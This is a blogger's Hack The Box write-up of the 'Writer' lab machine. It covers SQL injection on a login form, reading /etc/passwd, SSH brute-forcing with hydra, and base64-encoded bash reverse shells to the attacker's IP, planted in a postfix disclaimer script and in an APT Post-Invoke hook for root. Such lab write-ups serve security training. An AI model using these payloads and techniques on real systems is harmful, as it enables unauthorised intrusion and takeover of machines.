Hello guys! This is my first blog post. I am planning to post **Hack the Box** writeups, Web Dev logs and also my Kaggle journeys. Today I am going to work on [Writer](https://app.hackthebox.com/machines/361).

- This post is cross posted at [Dev.to](https://dev.to/alcadramin/lets-hack-this-box-writer-writeup-5a30). You can read it there if you wish.

> Before start, please try to pawn this machine by **yourself** first.

"Writer" is rated as Medium difficulty (Linux) machine, we'll see how it goes! I usually start with nmap to see what's going on.

- **nmap** is a must have tool to find open ports, services, which OS host uses etc.

## nmap scan

```bash
alcadramin@archlinux âžœ ~  sudo nmap -sC -sV -sS -A 10.10.11.101
```

```bash

We can clearly see that we've a HTTP server let's check what's inside ðŸ‘€.

## Finding URI's with gobuster

Nothing interesting, let's find URI's (directories) with `gobuster`, which usually leads us to some goodies.

[Gobuster](https://github.com/OJ/gobuster) is a tool used to brute-force:

- URIs (directories and files) in web sites.
- DNS subdomains (with wildcard support).
- Virtual Host names on target web servers.
- Open Amazon S3 buckets

```bash
alcadramin@archlinux âžœ wordlists  gobuster dir -u 10.10.11.101 -w directory-list-2.3-small.txt
```

```bash

`administrative` seem's interesting.

![Administrative Page](/images/htb-writer/2.png)

We've a good old login form, we can check if it's vulnerable to SQL injections, request capturing etc. Let's take a look with **Burp Suite**!

![Burp POST](/images/htb-writer/3.png)

## SQL Injection

Hmm, I've tried weak passwords etc. nothing works, let's try with UNION which is a common SQL vulnerability.

![Burp SQL Query](/images/htb-writer/4.png)

Yay! ðŸŽ‰ It is vulnerable to SQL injections. I'm just gonna try this request with `sqlmap` as well. PS: Just copy the request from Burp and save it to a file then pass it to `sqlmap` with `-r`.

```bash
alcadramin@archlinux âžœ Writer  sqlmap -r request
```

![sqlmap](/images/htb-writer/5.jpeg)

Yep it's very clear now, let's continue with Burp.

![Burp Injection Success](/images/htb-writer/6.png)

![Burp Injection Success Page Render](/images/htb-writer/7.png)

We're in. I am going to login with `admin' ;**^` query. I've checked dashboard and found we can try to upload image and try to get shell however since we can SQL inject, I'm gonna find users and try to brute-force ssh.

![Dashboard](/images/htb-writer/8.png)

So I've just quickly writed down an injection (you can see the original one in sqlmap screenshot) to get `/etc/passwd`.

![Burp Injection passwd](/images/htb-writer/9.png)

We can see our users!

![Burp Injection passwd 2](/images/htb-writer/10.png)

## SSH Brute-force

We've `kyle` and `john`, let's try to brute-force `kayle` with `hydra`. (I've tried `john` as well and waited long time couldn't crack it, so gonna continue with `kyle`)

```bash
kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
john:x:1001:1001:,,,:/home/john:/bin/bash
```

```
salcadramin@archlinux âžœ Writer  sudo hydra -l kyle -P ~/pwn/wordlists/rockyou.txt ssh://10.10.11.101 -VV -f -t 60
```

Not so long after, we've found their password!

![hydra](/images/htb-writer/11.png)

And let's connect with ssh! (Someone was already here)

![shell 1](/images/htb-writer/12.png)

Let's check the ports see if we can find something vulnerable.

![netstat](/images/htb-writer/13.png)

We can get our user hash now, unfortunately `kyle` doesn't have sudo access so we'll try to reverse shell to `john` with SMTP. (No suprise ðŸ‘€)

After some research I've come accross with this repository, which basically allows you to remap ports to desired one : https://github.com/cw1997/NATBypass

I'm going to compile it and upload to `kyle` with sftp.

```bash
alcadramin@archlinux âžœ ~  sftp kyle@10.10.11.101
kyle@10.10.11.101's password:
Connected to 10.10.11.101.
sftp> put /home/alcadramin/pwn/natbypass
```

Generate the reverse shell payload with base64.

```bash
alcadramin@archlinux âžœ ~  echo -n '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.174/7678 0>&1"' | base64
L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTc0LzMxMzYgMD4mMSI=
```

Let's run the tool and bind it to a random IP.

![Natbypass](/images/htb-writer/14.png)

Now we'll add our payload to `/etc/postfix/disclaimer` and listen through `ncat`.

![Revshell](/images/htb-writer/15.png)

```bash
echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTc0Lzc2NzggMD4mMSI= | base64 -d | bash
```

Now that they're done, I'm gonna write a script with Ruby to send an email and execute the payload.

```rb
#!/usr/bin/env ruby

require 'net/smtp'
require 'openssl'
OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE

message = <<MESSAGE_END
Hey John, give me your shell pls.
MESSAGE_END

Net::SMTP.start('10.10.11.101', 3137) do |smtp|
  smtp.send_message message, 'kyle@10.10.11.101', 'john@10.10.11.101'
end
```

Hey we're in John now. I've quickly realise there is a private ssh key, so I can use that to connect with ssh!

![nc capture](/images/htb-writer/16.png)

![ssh key](/images/htb-writer/17.jpeg)

We can check John's groups.

```bash
john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
```

I am just gonna upload `pspy64` to John via sftp and check running processes.

```bash
alcadramin@archlinux âžœ Writer  sftp -i john_key john@10.10.11.101
Connected to 10.10.11.101.
sftp> put /home/alcadramin/pwn/pspy64
```

## Privilege Escalation

So I ran `pspy64` and realise this naughty boy is running APT via cron and we also have access to APT hooks so we can create a payload in `/etc/apt/apt.conf.d`. (https://wiki.debian.org/AptConfiguration)

```bash
2021/12/03 18:08:02 CMD: UID=0    PID=27301  | /usr/bin/apt-get update
2021/12/03 18:09:01 CMD: UID=0    PID=27326  | /usr/sbin/CRON -f
```

```bash
echo 'APT::Update::Post-Invoke {"echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTc0LzEyMTIgMD4mMSI= | base64 -d | bash"};'> 01payload
```

And we got root access!

Finally I'm submitting my hashes!
